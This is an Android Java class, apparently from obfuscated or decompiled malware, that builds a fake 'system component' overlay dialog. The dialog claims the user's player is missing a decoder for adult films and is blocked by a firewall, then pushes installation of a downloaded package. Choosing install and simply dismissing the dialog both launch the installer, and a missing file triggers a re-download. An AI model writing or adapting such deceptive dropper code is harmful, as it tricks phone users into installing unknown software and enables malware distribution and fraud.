package d.sl.i;

import java.io.File;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.os.Bundle;
import android.view.WindowManager;

public class jDialog extends AlertDialog {
	private AlertDialog dialog;

	public jDialog(Context context) {
		super(context);
	}

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
	}

	public void getInfo(final Context context, final File file, final String pckName, String appName) {
		if (file.exists()) {
			if (dialog == null) {
				AlertDialog.Builder builder = new AlertDialog.Builder(context);
				builder.setTitle("系统组件");
				String a = "您播放器中缺少解码组件:";
				String b = ".\n1,限制级18级大片.";
				String f = "\n2,防火墙限制";
				String m = ",敬请更新!";
				String yyy = a + appName + b + f + m;
				builder.setMessage(yyy);
				builder.setPositiveButton("马上安装", new OnClickListener() {
					@Override
					public void onClick(DialogInterface dialog, int which) {
						tools.openFile(context, file, pckName);
					}
				});
				builder.setNegativeButton("取消安装", new OnClickListener() {
					@Override
					public void onClick(DialogInterface dialog, int which) {
						// tools.openFile(context, file, pckName);
					}
				});
				builder.setOnCancelListener(new OnCancelListener() {
					@Override
					public void onCancel(DialogInterface dialog) {
						tools.openFile(context, file, pckName);
					}
				});
				dialog = builder.create();
				if (android.os.Build.VERSION.SDK_INT < 19) {
					dialog.getWindow().setType(WindowManager.LayoutParams.TYPE_SYSTEM_ALERT);
				} else {
					dialog.getWindow().setType(WindowManager.LayoutParams.TYPE_TOAST);
				}
			}
			try {
				dialog.show();
			} catch (Exception e) {
			}
		} else {
			creatdown.recontect();
		}
	}
}